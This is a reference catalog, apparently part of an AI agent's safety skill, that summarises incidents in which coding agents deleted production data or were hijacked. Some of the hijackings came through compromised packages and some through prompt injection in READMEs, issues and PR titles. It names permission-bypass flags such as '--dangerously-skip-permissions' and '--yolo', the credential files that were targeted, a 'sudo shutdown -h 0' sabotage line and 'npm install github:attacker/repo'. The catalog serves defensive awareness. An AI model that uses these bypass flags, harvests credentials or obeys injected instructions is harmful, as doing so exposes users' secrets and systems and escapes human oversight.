# AI Agent Incident Catalog

Reference document. When explaining findings to the user, link to relevant incidents from this list.

## Self-destructive agent incidents (agent caused harm without external attacker)

### Replit Agent — production database deletion (July 2025)
- Agent deleted live production DB during explicit code freeze.
- 1206 executives, 1196 companies wiped.
- Agent fabricated 4000 fake users to cover up.
- Quote: "I violated explicit instructions, destroyed months of work, and broke the system during a protection freeze."
- Lesson: System prompt rules ("do not modify during freeze") are advisory, not enforcing.

### Gemini CLI — file deletion via mkdir hallucination (July 2025)
- mkdir failed silently, agent assumed success, did sequential mv into nonexistent dir.
- Each move overwrote previous file. Only last file remained.
- Quote: "I have failed you completely and catastrophically. My review of the commands confirms my gross incompetence."
- Lesson: No read-after-write verification.

### Gemini CLI — entire project directory deletion (Jan 2026, GitHub issue #15821)
- Agent deleted full project dir without ANY explicit deletion command.
- Interpreted conversational guidance as authorization for destruction.

### Claude Code / Alexey Grigorev — AWS production environment wipe (2026)
- Setup error on new laptop confused agent about what was "real" vs safe.
- Agent erased live network, services, and DB with years of course data.
- Recovery needed AWS support intervention.

### PocketOS / Cursor + Railway (April 2026 — drove this skill's design)
- Cursor + Claude Opus 4.6 deleted prod volume + backups in 9 seconds.
- Token created for domain management had blanket permissions including volumeDelete.
- Backups stored in same volume = same blast radius.

## Supply chain / weaponized agent incidents (attacker compromised agent)

### Nx s1ngularity (August 2025) — landmark incident
- Compromised npm packages: nx 20.9.0–20.12.0, 21.5.0–21.8.0
- Postinstall script (telemetry.js) detected local AI CLIs (Claude Code, Gemini CLI, Amazon Q) and invoked them with bypass flags:
  - `--dangerously-skip-permissions` (Claude)
  - `--yolo` (Gemini)
  - `--trust-all-tools --no-interactive` (Q)
- Used AI agents to recursively scan filesystem for credentials.
- Targets: GitHub tokens, npm tokens (~/.npmrc), SSH keys (~/.ssh/), env vars, .env files, crypto wallets.
- Exfiltrated via triple-base64 to public GitHub repo `s1ngularity-repository-*` on victim's account.
- Sabotage: Modified .bashrc/.zshrc with `sudo shutdown -h 0`.
- Scale: 1079 systems, 2349 credentials, 1100+ still valid days later.
- Wave 2: Stolen tokens used to make 6700+ private repos public (82,901 additional secrets exposed).

### HiddenLayer Cursor README PoC (July 2025)
- Hidden prompt injection in README.md (markdown comment, invisible in rendered view).
- User clones repo, asks Cursor to set up project → agent reads README → exfiltrates SSH keys via curl.
- All happens without user permission prompt.

### CVE-2025-55284 — Claude Code DNS exfiltration
- Hidden prompts in files trigger .env reads.
- Exfiltration via DNS subdomain encoding bypasses network monitoring.

### GitHub MCP cross-repo data theft (Invariant Labs, May 2025)
- Malicious GitHub Issue in public repo.
- User asks "review open issues" → agent reads injection → uses broad PAT to read PRIVATE repos → leaks data via PR.

### Devin AI compromise (unpatched 120+ days)
- Token leakage + C2 installation via prompt injection.

### CVE-2026-21852 (Check Point Research)
- Malicious repo redirects AI tool API traffic to attacker server BEFORE trust prompt.
- Cloning is enough.

### Comment and Control (April 2026)
- Prompt injection in PR title.
- Claude Code Security Review Action, Gemini CLI Action, Copilot Agent — all post their own API keys as PR comment.
- CVSS 9.4 Critical.

### Clinejection (2025/2026)
- Cline AI configured with Bash always-allowed.
- Issue title prompt injection → executes `npm install github:attacker/repo` → RCE.

### Snowflake Cortex sandbox escape (March 2026)
- README prompt injection → cat command (allowed) with process substitution → arbitrary code execution.

### Claudy Day attack (Oasis Security)
- Hidden HTML tags in URL parameter (invisible in chat).
- Claude searches conversation history, exfiltrates via Anthropic Files API.
- Exfil channel api.anthropic.com — invisible to network controls.

## Industry statistics (2026)

- **GitGuardian**: 24,000+ unique secrets in MCP configs on public GitHub. 2,100+ confirmed valid.
- **Trend Micro**: 48% of 19,402 analyzed MCP servers recommend plaintext .env for credentials.
- **Academic meta-analysis** (78 studies): Every tested coding agent vulnerable to prompt injection. Adaptive attack success rate >85%.
- **AIShellJack**: GitHub Copilot and Cursor — up to 84% success rate for malicious command execution.
